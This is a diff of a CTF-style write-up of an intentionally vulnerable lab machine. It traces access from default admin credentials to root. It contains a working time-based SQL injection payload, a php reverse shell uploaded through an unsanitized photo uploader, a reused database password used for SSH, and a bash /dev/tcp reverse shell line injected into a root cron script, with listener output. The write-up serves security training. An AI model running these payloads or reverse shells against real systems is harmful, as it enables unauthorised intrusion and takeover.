@@ -1,26 +1,15 @@
 ## Box: [Academy] — Started: 2025-10-16 20:10
 
-**IP/Host:** VM Mac ADDR `00:0C:29:56:42:1F`  |  **Status:** `In-Progress`
-**Session IP**: 192.168.109.131
-
-### in prog notes
-
-grimmie ???
-jdelta ???
-
-`academy` -> 10201321:thxforlettingmein
-`academy/admin` -> admin:admin
-
-`phpMyAdmin` ???
-SSH or root ???
-
-
+**IP/Host:** VM Mac ADDR `00:0c:29:e8:fc:4c`  |  **Status:** `In-Progress`
+**Session 1 IP**: 192.168.109.131
+**Session 2 IP**: 192.168.109.132
+**Session 3 IP**: 192.168.109.134
 
 ### TL;DR
 
-**NOTE**: This is an intenionally vulnerable machine, so I'm treating this as though it were a CTF. As such, data from the machine will be included in this writeup, and I will also do things I normally wouldn't do in an engagement (such as change a student's password!)
+**NOTE**: This is an intentionally vulnerable machine, so I'm treating this as though it were a CTF. As such, data from the machine will be included in this writeup, and I will also do things I normally wouldn't do in an engagement (such as change a student's password!)
 
-Initial: `how in`. PrivEsc: `how root`.
+Initial: `reverse shell script on vulnerable file uploader function`. PrivEsc: `reverse shell one liner on vulnerable a cron job script`.
 
 *Cumulative Impact Overview*:
 - data exfil on unsecured site
@@ -217,7 +206,148 @@ Session completed.
 - admin:admin into `academy/admin` from the second round of enum got us to the online course admin panel
 ![[Pasted image 20251017000737.png|500]]
 
+- in the `admin` panel, attempting to reset Rum Ham's password shows the url in the browser tools uses a script that's called after the query operator:
+http://192.168.109.131/academy/admin/manage-students.php?id=10201321&pass=update
+- In the `admin` panel the majority of the tabs in the webapp don't seem to do much, but `/session` and `/department` accepts input that seems to get into the DB. This seems potentially vulnerable to SQL injection
+
+Trying `sqlmap`:
+```bash
+└─$ sqlmap -r sqltesting.txt --batch
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:10:52 /2025-10-18/
+
+[14:10:52] [INFO] parsing HTTP request from 'sqltesting.txt'
+[14:10:52] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[14:10:52] [INFO] resuming back-end DBMS 'mysql' 
+[14:10:52] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://192.168.109.132/academy/admin/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: sesssion (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sesssion=test' AND (SELECT 7947 FROM (SELECT(SLEEP(5)))tKIo) AND 'LbYK'='LbYK&submit=
+---
+[14:10:52] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 10 (buster)
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[14:10:52] [INFO] fetched data logged to text files under '/home/l1ch/.local/share/sqlmap/output/192.168.109.132'
+
+[*] ending @ 14:10:52 /2025-10-18/
+
+```
+
+- Valid SQLi payload: sesssion=' AND (SELECT 7947 FROM (SELECT(SLEEP(5)))tKIo) AND 'LbYK'='LbYK
+    - worked for both `/session` and `department`
+
+At this point I started wondering if I was overcomplicating this, which would usually be when I look to a senior engineer for point in the right direction, so in my case I looked to a walkthrough. I thought working from the `admin` panel would have been the best way to continue to escalate or get a shell, however the walkthrough showed me that using the photo upload feature in `/academy` (non-admin panel) allowed for code exec, which if uploading a php reverse shell script allows you to connect and get a reverse shell.
+
+Here is how that was done:
+- paste code from https://github.com/pentestmonkey/php-reverse-shell to a shell script: `└─$ nano payloads/phprvshell.php` 
+    - Ensure code is pointed at correct IPADDR and port for you, and other options are satisfied
+- start nc listener on attack box for port and IP addr (see [[Shell Ops]] for more details)
+- upload shell script to vuln app, like you would in the below screenshot by clicking `browse` > `update`:
+![[Pasted image 20251018181558.png|500]]
+
+- Reverse shell should have started on `netcat` listener you set up:
+```bash
+└─$ nc -nvlp 1234               
+listening on [any] 1234 ...
+connect to [192.168.109.128] from (UNKNOWN) [192.168.109.134] 34150
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 15:58:18 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+- From there we uploaded [[Linpeas|linpeas]] ran it, and got this useful output out of it:
+```bash
+==MYSQL PWD==
+
+/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
+
+Linpeas potential escalation vector:
+* * * * * /home/grimmie/backup.sh
+```
+
+- outputting the contents of the `config.php` from above gives us:
+```bash
+$ cat /var/www/html/academy/admin/includes/config.php
+<?php
+$mysql_hostname = "localhost";
+$mysql_user = "grimmie";
+$mysql_password = "My_V3ryS3cur3_P4ss";
+$mysql_database = "onlinecourse";
+$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
+?>
+```
+
+- since `grimmie` reuses pws we know that `My_V3ryS3cur3_P4ss` is likely the same to ssh in as him. Sure enough...
+
+```bash
+┌──(l1ch㉿kali)-[~]
+└─$ ssh grimmie@192.168.109.135
+The authenticity of host '192.168.109.135 (192.168.109.135)' can't be established.
+ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:2: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.109.135' (ED25519) to the list of known hosts.
+grimmie@192.168.109.135's password: 
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Oct 18 18:34:36 2025 from 192.168.109.128
+grimmie@academy:~$ ls
+backup.sh
+
+```
+
+- because that backup.sh script likely runs as root we can try to get to root via reverse shell. Added this line to the `backup.sh` script:
+```bash
+bash -i >& /dev/tcp/192.168.109.128/1234 0>&1
+```
+
+```bash
+┌──(l1ch㉿kali)-[~]
+└─$ nc -nvlp 1234    
+listening on [any] 1234 ...
+connect to [192.168.109.128] from (UNKNOWN) [192.168.109.135] 58404
+bash: cannot set terminal process group (837): Inappropriate ioctl for device
+bash: no job control in this shell
+root@academy:~#
+
+```
+
 5. *Post-Exploitation*:
+- Rooted!
+```bash
+root@academy:~# ls   
+ls
+flag.txt
+root@academy:~# cat flag.txt    
+cat flag.txt
+Congratz you rooted this box !
+Looks like this CMS isn't so secure...
+I hope you enjoyed it.
+If you had any issue please let us know in the course discord.
+
+Happy hacking !
+root@academy:~# 
+```
 
 *Proof — path to flags/screenshot of boxpwn*:
 
@@ -225,9 +355,12 @@ Session completed.
 
 - _Found_: 80 - 192.168.109.131 - 2025-10-16 21:12:27 - Default Apache page served (`It works!`) — default vhost present; server reachable; potential fingerprinting/info exposure.
 - *Found*: 21 - 192.168.109.131 - 2025-10-16 21:31:55 - FTP, while a non-vulnerable version, does allow for anonymous login. -> `note.txt` is downloadable anonymously, and is sensitive data exposure
-    - *Found*: 21 -> 80 - 192.168.109.131/academy - 2025-10-16 22:00:19 - Was allowed access to student's account and changed their password
-- *Found*: 80 - 192.168.109.131/academy - 2025-10-17 00:02:29 - unrestricted access to SQL db named `onlinecourse.sql`, which contains admin's password hash
-- *UNCONFIRMED - Found*: 80 - 192.168.109.131/academy/admin - 2025-10-17 00:33:34 - Bad admin credentials (presumably default admin credentials)
+    - *Found*: 21 -> 80 - 192.168.109.131/academy - 2025-10-16 22:00:19 - Was allowed access to student's account and ability to change their password
+- *Found*: 80 - 192.168.109.131/academy/db - 2025-10-17 00:02:29 - unrestricted access to SQL db named `onlinecourse.sql`, which contains admin's password hash
+- *Found*: 80 - 192.168.109.131/academy/admin - 2025-10-17 00:33:34 - Bad admin credentials (default admin credentials)
+- *Found*: 80 - 192.168.109.134/academy - 2025-10-18 19:50:44 - Unsanitized file uploader in Student Photo feature of webapp allows for remote code execution, such as reverse shell which was successfully used for initial access
+- *Found*: 22 - 192.168.109.134 - 2025-10-18 19:49:19 - Admin password reuse and unencrypted/permissive password file allows for wide access to system and SSH after initial reverse shell exploitation
+- *Found*: 192.168.109.134 - 2025-10-18 19:49:06 - `www-data` user is able to change file permissions itself, which allows for further exploitation if shell access is gained. `www-data` user should instead call on a different, higher level user which authenticates the action to disallow file uploads and created files to be ran, which is an escaltion vector that was successfully exploited to gain access to the `grimmie` user
 
 ### Commands Learned or Commands Used
 
@@ -238,4 +371,3 @@ nmap -sC -sV x.x.x.x         # quick scan — YYYY-MM-DD HH:MM
 curl 'http://x.x.x.x/login'  # check auth endpoint
 ```
 
-## Scratchpad
